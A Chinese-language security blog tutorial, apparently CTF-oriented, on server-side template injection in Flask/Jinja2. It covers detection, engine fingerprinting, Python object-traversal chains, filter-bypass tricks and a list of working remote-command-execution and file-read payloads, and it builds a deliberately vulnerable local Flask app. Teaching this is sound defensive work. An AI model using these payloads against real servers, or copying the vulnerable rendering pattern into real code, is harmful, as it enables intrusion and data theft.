@@ -1,0 +1,605 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hoylindo || SSTI-模板注入</title>
+    <meta name="author" content="hoylindo">
+    <meta name="description" content="嗨，这里是一个搭建的不太熟练的小破站 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/1.jpg">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/maiden-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#fba3cf; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>dadada~</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hoylindo</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Hoylindo</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>SSTI-模板注入 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2022/9/22
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/关于web安全">
+                <span class="icon">
+                    <a-icon type="book" theme="filled" />
+                </span>
+                关于web安全
+            </a>
+        </span>
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/SSTI" style=color:#00bcd4>
+                    SSTI
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <br>
+
+<span id="more"></span>
+
+<p>SSTI 就是服务器端模板注入（Server-Side Template Injection），注入的本质就是格式化字符串漏洞的一种体现</p>
+<h3 id="关于服务器端模板引擎"><a href="#关于服务器端模板引擎" class="headerlink" title="关于服务器端模板引擎"></a>关于服务器端模板引擎</h3><ul>
+<li><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档</p>
+</li>
+<li><p>模板引擎会提供一套生成 HTML 代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板 + 用户数据的前端 HTML 页面，然后反馈给浏览器，呈现在用户面前</p>
+</li>
+<li><p>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过</p>
+<p>[^ 沙箱机制 ]: Sandboxie自带一个快捷方式，就是在沙盘中运行IE。 Sandboxie是一款专业的虚拟类软件，它的工作软件：通过重定向技术，把程序生成和修改的文件，定向到自身文件夹中。 当然，这些数据的变更，包括注册表和一些系统的核心数据。 通过加载自身的驱动来保护底层数据，属于驱动级别的保护</p>
+</li>
+</ul>
+<h3 id="关于模板注入"><a href="#关于模板注入" class="headerlink" title="关于模板注入"></a>关于模板注入</h3><ul>
+<li><p>SSTI 存在于MVC模式当中的 View 层；M 为 Model 数据层，V 为 View 视图层；C 为 Controller 控制层，而 SSTI 就存在于 View 视图层当中</p>
+</li>
+<li><p>当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户</p>
+</li>
+<li><p>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题，其影响范围主要取决于模版引擎的复杂性</p>
+</li>
+<li><p>例如：</p>
+<pre><code class="php">$output = $twig-&gt;render(&quot;Hello &#123;&#123;name&#125;&#125;&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;])); 
+echo $output;
+</code></pre>
+</li>
+</ul>
+<h4 id="SSTI探测"><a href="#SSTI探测" class="headerlink" title="SSTI探测"></a>SSTI探测</h4><ul>
+<li><p>最常用的方法是通过注入模板表达式中常用的一系列特殊字符来尝试模糊模板 ————这也被称作 fuzz 测试，例如<code>$&#123;&#123;<%[%'"&#125;&#125;%\</code></p>
+</li>
+<li><p>如果服务器返回了相关的异常语句则说明服务器可能在解析模板语法，然而 SSTI 漏洞会出现在两个不同的上下文中，并且需要使用各自的检测方法来进一步检测 SSTI 漏洞</p>
+<ul>
+<li><p><strong>纯文字上下文：</strong></p>
+<ul>
+<li><p>有的模板引擎会将模板语句渲染成 HTML，例如 Freemarker</p>
+<pre><code class="js">render(&#39;Hello&#39; + username) --&gt; Hello Apce
+</code></pre>
+</li>
+<li><p>因为会渲染成 HTML，所以这还可以导致 XSS 漏洞。但是模板引擎会自动执行数学运算，所以如果我们输入一个运算，例如</p>
+<pre><code class="http">http://xxxx/?username=$&#123;7*7&#125;
+</code></pre>
+</li>
+<li><p>如果模板引擎最后返回 Hello 49 则说明存在 SSTI 漏洞，注意：不同的模板引擎的数学运算的语法有些不同</p>
+</li>
+</ul>
+</li>
+<li><p><strong>代码上下文：</strong></p>
+<ul>
+<li><p>下面代码是用来生成邮件的</p>
+<pre><code class="js">greeting = getQueryParameter(&#39;greeting&#39;)
+engine.render(&quot;Hello &#123;&#123;"+greeting+"&#125;&#125;&quot;, data)
+</code></pre>
+</li>
+<li><p>上面代码通过获取静态查询参数 greeting 的值然后再填充到模板语句中，如果我们提前将双花括号闭合，就可以注入自定义的语句了</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="确定-Web-界面所用的模板引擎"><a href="#确定-Web-界面所用的模板引擎" class="headerlink" title="确定 Web 界面所用的模板引擎"></a>确定 Web 界面所用的模板引擎</h4><ul>
+<li><p>算是探测的一种，但是这种探测是基于已知 SSTI 漏洞存在的二次探测，一般的做法是触发报错</p>
+</li>
+<li><p>触发报错的方式很多，以 Ruby 的 ERB 引擎为例，输入无效表达式<code>&lt;%foobar%&gt;</code>触发报错</p>
+<p>可以得到如下报错信息：</p>
+<pre><code class="js">(erb):1:in `&lt;main&gt;&#39;: undefined local variable or method `foobar&#39; for main:Object (NameError)
+from /usr/lib/ruby/2.5.0/erb.rb:876:in `eval&#39; 
+from /usr/lib/ruby/2.5.0/erb.rb:876:in `result&#39; 
+from -e:4:in `&lt;main&gt;&#39;
+</code></pre>
+</li>
+<li><p>根据不同的报错得到不同的模板引擎，我们可以按照这张图进行判断<code>&#123;% asset_img template-decision-tree.png %&#125;</code></p>
+</li>
+<li><p>有的时候相同的 payload 可能会有两种响应，比如<code>&#123;&#123;7*’7’&#125;&#125;</code>在 Twig 中会得到 49，而在 Jinja2 中会得到 7777777</p>
+</li>
+</ul>
+<h4 id="确定引擎之后"><a href="#确定引擎之后" class="headerlink" title="确定引擎之后"></a>确定引擎之后</h4><ul>
+<li><p>阅读模板引擎语法、安全文档、已知利用文章</p>
+<pre><code class="python">&lt;%
+import os
+x=os.popen(&#39;id&#39;).read()
+%&gt;
+$&#123;x&#125;
+#这段代码可以在非沙箱环境中实现远程代码执行，包括读取、编辑或删除任意文件
+#python调用Shell脚本，有两种方法：os.system()和os.popen(),前者返回值是脚本的退出状态码，后者的返回值是脚本执行过程中的输出内容
+</code></pre>
+</li>
+<li><p>探索环境</p>
+</li>
+<li><p>构造自定义利用</p>
+</li>
+</ul>
+<h3 id="一些python的魔术方法和内置类"><a href="#一些python的魔术方法和内置类" class="headerlink" title="一些python的魔术方法和内置类"></a>一些python的魔术方法和内置类</h3><ul>
+<li><code>__class__</code>用于返回该对象所属的类</li>
+<li><code>__base__</code>用于获取类的基类（也称父类）</li>
+<li><code>__mro__</code>返回解析方法调用的顺序。（当调用<code>_mro_[1]</code>或者-1时作用其实等同于<code>_base_</code>）</li>
+<li><code>__subclasses__()</code>可以获取类的所有子类</li>
+<li><code>config</code>的用法，<code>config</code>是Flask模版中的一个全局对象，它包含了所有应用程序的配置值，所以可以使用 config.xxx 来查看该对象的属性值</li>
+<li><code>__bases__</code>返回基类元组</li>
+<li><code>__init__</code>调用初始化函数，可以用来跳到<code>__globals__</code></li>
+<li><code>__globals__</code>返回函数所在的全局命名空间所定义的全局变量，返回字典</li>
+<li><code>__builtins__</code>返回内建内建名称空间字典</li>
+<li><code>__dic__</code>类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的<code>__dict__</code>里</li>
+<li><code>__getattribute__()</code>实例、类、函数都具有的<code>__getattribute__</code>魔术方法；在实例化的对象进行<code>.</code>操作的时候（形如:a.xxx/a.xxx()都会自动去调用<code>__getattribute__</code>方法；因此可以直接通过这个方法来获取到实例、类、函数的属性</li>
+<li><code>__getitem__()</code>调用字典中的键值，其实就是调用这个魔术方法，比如<code>a[&#39;b&#39;]</code>，就是<code>a.__getitem__(&#39;b&#39;)</code><br><code>__builtins__</code>内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数</li>
+<li><code>__import__</code>动态加载类和函数，也就是导入模块，经常用于导入os模块，<code>__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()</code></li>
+<li><code>__str__()</code>返回描写这个对象的字符串，可以理解成就是打印出来。</li>
+<li><code>url_for</code>flask的一个方法，可以用于得到<code>__builtins__</code>，而且<code>url_for.__globals__[&#39;__builtins__&#39;]</code>含有<code>current_app</code></li>
+<li><code>get_flashed_messages</code>flask的一个方法，可以用于得到<code>__builtins__</code>，而且<code>url_for.__globals__[&#39;__builtins__&#39;]</code>含有current_app</li>
+<li><code>lipsum</code> flask的一个方法，可以用于得到<code>__builtins__</code>，而且<code>lipsum.__globals__</code>含有os模块：<code>&#123;&#123;lipsum.__globals__['os'].popen('ls').read()&#125;&#125;</code><br><code>&#123;&#123;cycler.__init__.__globals__.os.popen('ls').read()&#125;&#125;</code></li>
+<li><code>current_app</code>应用上下文，一个全局变量</li>
+<li><code>request</code>可以用于获取字符串来绕过，包括下面这些：<ul>
+<li>open函数:<code>request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/proc\self\fd/3&#39;).read()</code></li>
+<li><code>request.args.x1</code>get传参</li>
+<li><code>request.values.x1</code>所有参数</li>
+<li><code>request.cookies</code>cookies参数</li>
+<li><code>request.headers</code>请求头参数</li>
+<li><code>request.form.x1</code>post传参：<code>Content-Type:applicaation/x-www-form-urlencoded</code>或<code>multipart/form-data)</code></li>
+<li><code>request.datapost</code>传参：<code>Content-Type:a/b)</code></li>
+<li><code>request.jsonpost</code>传json：<code>Content-Type: application/json</code></li>
+<li>config当前application的所有配置，也可以这样<code>&#123;&#123;config.__class__.__init__.__globals__['os'].popen('ls').read() &#125;&#125;</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="常用过滤器"><a href="#常用过滤器" class="headerlink" title="常用过滤器"></a>常用过滤器</h3><ul>
+<li><p>过滤器通过管道符号（|）与变量连接,并且在括号中可能有可选的参数</p>
+</li>
+<li><p>可以链接到多个过滤器.一个滤波器的输出将应用于下一个过滤器</p>
+</li>
+<li><p>可以实现一些简单的功能，比如attr()过滤器可以实现代替<code>.</code>，join()可以将字符串进行拼接，reverse可以将字符串反置等等</p>
+<pre><code class="python">length()：    # 获取一个序列或者字典的长度并将其返回
+int()：       # 将值转换为int类型
+float()：     # 将值转换为float类型
+lower()：     # 将字符串转换为小写
+upper()：     # 将字符串转换为大写
+reverse()：   # 反转字符串
+list()：      # 将变量转换为列表类型；
+string()：    # 将变量转换成字符串类型；
+join()：      # 将一个序列中的参数值拼接成字符串,通常有python内置的dict()配合使用
+attr():       # 获取对象的属性
+replace(value,old,new)： # 将value中的old替换为new
+</code></pre>
+</li>
+</ul>
+<h3 id="SSTI语句构造"><a href="#SSTI语句构造" class="headerlink" title="SSTI语句构造"></a>SSTI语句构造</h3><ol>
+<li><p>拿到当前类，也就是用<code>__class__</code>——<code>name=&#123;&#123;"".__class__&#125;&#125;</code></p>
+</li>
+<li><p>拿到基类，这里可以用<code>__base__</code>，也可以用<code>__mro__</code>——<code>name=&#123;&#123;"".__class__.__bases__[0]&#125;&#125;</code>||<code>name=&#123;&#123;"".__class__.__mro__[1]&#125;&#125;</code> ||<code>name=&#123;&#123;"".__class__.__mro__[-1]&#125;&#125;</code></p>
+</li>
+<li><p>拿到基类的子类，用<code>__subclasses__()</code>——<code>name=&#123;&#123;"".__class__.__bases__[0]. __subclasses__()&#125;&#125;</code></p>
+</li>
+<li><p>找可利用的类，寻找那些有回显的或者可以执行命令的类，大多数利用的是<code>os._wrap_close</code>这个类，可以用一个简单脚本来寻找它对应的下标：</p>
+<pre><code class="python">import requests
+
+headers = &#123;
+    &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#39;&#125;
+for i in range(500):
+    url = &quot;http://127.0.0.1:5000/?name=\
+        &#123;&#123;().__class__.__bases__[0].__subclasses__()["+str(i)+"]&#125;&#125;&quot;
+    res = requests.get(url=url, headers=headers)
+    if &#39;os._wrap_close&#39; in res.text:
+        print(i)
+        exit()
+</code></pre>
+</li>
+<li><p>接下来就可以利用<code>os._wrap_close</code>，这个类中有<code>popen</code>方法，我们去调用它：</p>
+<ul>
+<li>先调用它的<code>__init__</code>方法进行初始化类——<code>name=&#123;&#123;"".__class__.__bases__[0]. __subclasses__()[138].__init__&#125;&#125;</code></li>
+<li>再调用<code>__globals__</code>获取到方法内以字典的形式返回的方法、属性等——<code>name=&#123;&#123;"".__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__&#125;&#125;</code></li>
+<li>然后就可以去进行RCE了——<code>name=&#123;&#123;"".__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__['popen']('dir').read()&#125;&#125;</code></li>
+</ul>
+</li>
+</ol>
+<h3 id="SSTI常见绕过方式"><a href="#SSTI常见绕过方式" class="headerlink" title="SSTI常见绕过方式"></a>SSTI常见绕过方式</h3><ul>
+<li><p>绕过<code>.</code>：</p>
+<ul>
+<li>用<code>[]</code>代替<code>.</code>——<code>&#123;&#123;"".__class__&#125;&#125;=&#123;&#123;""['__class']&#125;&#125;</code></li>
+<li>用<code>attr()</code>过滤器绕过——<code>&#123;&#123;"".__class__&#125;&#125;=&#123;&#123;""|attr('__class__')&#125;&#125;</code></li>
+</ul>
+</li>
+<li><p>绕过<code>_</code>：</p>
+<ul>
+<li>通过list获取字符列表，然后用pop来获取<code>_</code>——<code>&#123;% set a=(()|select|string|list).pop(24)%&#125;&#123;%print(a)%&#125;</code></li>
+<li>可以通过十六进制编码的方式进行绕过——<code>&#123;&#123;()["\x5f\x5fclass\x5f\x5f"]&#125;&#125; =&#123;&#123;().__class__&#125;&#125;</code></li>
+</ul>
+</li>
+<li><p>绕过<code>[]</code>：</p>
+<ul>
+<li>使用<code>__getitem__</code> 魔术方法，它可以把中括号转换为括号的形式——<code>__bases__[0]=__bases__.__getitem__(0)</code></li>
+</ul>
+</li>
+<li><p>绕过<code>&#123;&#123;`
+
+  - 利用jinja2的语法，用`&#123;%`来进行RCE：
+
+    ```jinja2
+    &#123;%print("".__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__['popen']('dir').read())%&#125;
+    ```
+
+  - 借助for循环和if语句：
+
+    ```jinja2
+    &#123;%for i in ''.__class__.__base__.__subclasses__()%&#125;&#123;%if i.__name__ =='_wrap_close'%&#125;&#123;%print i.__init__.__globals__['popen']('dir').read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;
+    ```
+
+- 绕过单引号和双引号：
+
+  - 采用`request.args.a`，然后给a赋值这种方式来进行绕过——`&#123;&#123;url_for.__globals__[request.args.a]&#125;&#125;&amp;a=__builtins__ </code>&lt;=&gt;<code>&#123;&#123;url_for.__globals__['__builtins__']&#125;&#125;</code></p>
+</li>
+<li><p>绕过args</p>
+<ul>
+<li><p>当使用args的方法绕过<code>&#39;</code>和<code>&quot;</code>时，可能遇见args被ban的情况，这个时候可以采用<code>request.cookies</code>和<code>request.values</code>：</p>
+<pre><code class="http">GET:&#123;&#123;url_for.__globals__[request.cookies.a]&#125;&#125;
+COOkie: &quot;a&quot; :&#39;__builtins__&#39;
+</code></pre>
+</li>
+</ul>
+</li>
+<li><p>绕过数字</p>
+<ul>
+<li>可以通过count来得到数字——<code>&#123;&#123;(dict(e=a)|join|count)&#125;&#125;</code></li>
+</ul>
+</li>
+<li><p>绕过关键字</p>
+<ul>
+<li>遇见<code>class</code>、<code>base</code>这种关键词被绕过的情况，通常使用的绕过方式是使用join拼接从而实现绕过——<code>&#123;&#123;dict(__in=a,it__=a)|join&#125;&#125;  =__init__</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h3><ul>
+<li><p>任意命令执行：</p>
+<pre><code class="jinja2">&#123;%for i in ''.__class__.__base__.__subclasses__()%&#125;&#123;%if i.__name__ =='_wrap_close'%&#125;&#123;%print i.__init__.__globals__['popen']('dir').read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;
+
+&#123;&#123;"".__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__['popen']('cat /flag').read()&#125;&#125;
+//这个138对应的类是os._wrap_close，只需要找到这个类的索引就可以利用这个payload
+
+&#123;&#123;url_for.__globals__['__builtins__']['eval']("__import__('os').popen('dir').read()")&#125;&#125;
+
+&#123;&#123;x.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat flag').read()")&#125;&#125;
+//x的含义是可以为任意字母，不仅仅限于x
+
+&#123;&#123;config.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat flag').read()")&#125;&#125;
+</code></pre>
+</li>
+<li><p>文件读取：</p>
+<pre><code class="jinja2">&#123;&#123;x.__init__.__globals__['__builtins__'].open('/flag', 'r').read()&#125;&#125;
+//x的含义是可以为任意字母，不仅仅限于x
+</code></pre>
+</li>
+</ul>
+<h3 id="实践一下"><a href="#实践一下" class="headerlink" title="实践一下"></a>实践一下</h3><ul>
+<li><p>先去Pycharm里弄一个新的flask项目</p>
+<pre><code class="python">from flask import Flask
+# 导入Flask类.用于后面实例化出一个WSGI应用程序.
+app = Flask(__name__)
+# 创建Flask实例,传入的第一个参数为模块或包名.
+@app.route(&#39;/&#39;)
+# 使用route（）装饰器告诉Flask什么样的URL能触发函数.route（）装饰器把一个函数绑定到对应的URL上，这里就是把helloworld这个函数与这个url绑定
+def hello_world():  # put application&#39;s code here
+    return &#39;Hello World!&#39;
+
+if __name__ == &#39;__main__&#39;:
+    app.run()
+# app.run()函数让应用在本地启动
+</code></pre>
+</li>
+<li><p>Flask的模板引擎是<code>jinja2</code>，常用标记：</p>
+<pre><code class="jinja2">注释： &#123;# 这是注释 #&#125;
+变量： &#123;&#123; post.title &#125;&#125;，或字典元素 &#123;&#123;your_dict['key']&#125;&#125; ，或列表 &#123;&#123;your_list[0]&#125;&#125;
+多行代码块： &#123;% 开始 %&#125; HTML标签 &#123;% 结束 %&#125;
+</code></pre>
+</li>
+<li><p>在给出模板渲染代码之前，先在本地构造一个html界面作为模板，位置在模板渲染代码的相同位置下，有一个<code>templates</code>文件夹，在里面写入一个html文件，内容如下：</p>
+<pre><code class="html">&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;SSTI_test&lt;/title&gt;
+  &lt;/head&gt;
+ &lt;body&gt;
+      &lt;h2&gt;Hello, &#123;&#123;name&#125;&#125;&lt;/h2&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+</li>
+<li><p>修改模板渲染代码(app.py)：</p>
+<pre><code class="python"># coding=utf-8
+from flask import Flask, request, render_template
+
+app = Flask(__name__)
+
+@app.route(&#39;/&#39;,methods=[&#39;GET&#39;])
+def hello_world():
+    query = request.args.get(&#39;name&#39;) # GET取参数name的值
+    return render_template(&#39;1.html&#39;, name=query) # 将name的值传入模板,进行渲染
+
+if __name__ == &quot;__main__&quot;:
+    app.run(host=&quot;0.0.0.0&quot;, port=5000, debug=True)
+  # 让操作系统监听所有公网 IP,此时便可以在公网上看到自己的web，同时开启debug，方便调试。
+</code></pre>
+</li>
+<li><p>此时传参：<code>?name=&#123;&#123;7*7&#125;&#125;</code>，页面返回<code>Hello, &#123;&#123;7*7&#125;&#125;</code>，没有进行运算</p>
+</li>
+<li><p>漏洞成因：当把这两个文件合并到一个文件中，就可能造成SSTI模板注入：</p>
+<pre><code class="python">from flask import Flask,request,render_template_string
+app = Flask(__name__)
+
+@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+def index():
+    name = request.args.get(&#39;name&#39;)
+    template = &#39;&#39;&#39;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;SSTI&lt;/title&gt;
+  &lt;/head&gt;
+ &lt;body&gt;
+      &lt;h2&gt;Hello, %s&lt;/h2&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+        &#39;&#39;&#39;% (name)
+    return render_template_string(template)
+if __name__ == &quot;__main__&quot;:
+    app.run(host=&quot;127.0.0.1&quot;, port=5000, debug=True)
+</code></pre>
+</li>
+<li><p>此时传参：<code>?name=&#123;&#123;7*7&#125;&#125;</code>，页面返回<code>Hello, 49</code>，因为<code>render_template</code>函数在渲染模板的时候使用了<code>%s</code>来动态地替换字符串，<code>&#123;&#123;&#125;&#125;`在`Jinja2`中作为变量包裹标识符，在渲染的时候会把`&#123;&#123;&#125;&#125;</code>包裹的内容进行解析</p>
+</li>
+</ul>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679">flask之ssti模版注入从零到入门 - 先知社区 (aliyun.com)</a></p>
+<p><a target="_blank" rel="noopener" href="http://tttang.com/archive/1698/#toc_web-361">FLask SSTI从零到入门 - 跳跳糖 (tttang.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425">SSTI模板注入绕过（进阶篇）_yu22x的博客-CSDN博客_ssti绕过</a></p>
+
+    </div>
+
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2022 - 2022 Hoylindo
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @hoylindo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <canvas id="background" style="position:fixed;top:0;left:0;width:100vw;height:100vh;pointer-events:none;z-index:-1" ></canvas> 
+    <script src="/js/1.js"></script>
+    
+    <canvas class="fireworks" style="position: fixed; left: 0; top: 0; z-index: 99999999; pointer-events: none;"></canvas>
+    <script type="text/javascript" src="/js/aixin.js"></script>
+    <script type="text/javascript" src="/js/anime.min.js"></script>
+    <script type="text/javascript" src="/js/fireworks.js"></script>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+</body>
+
+</html>
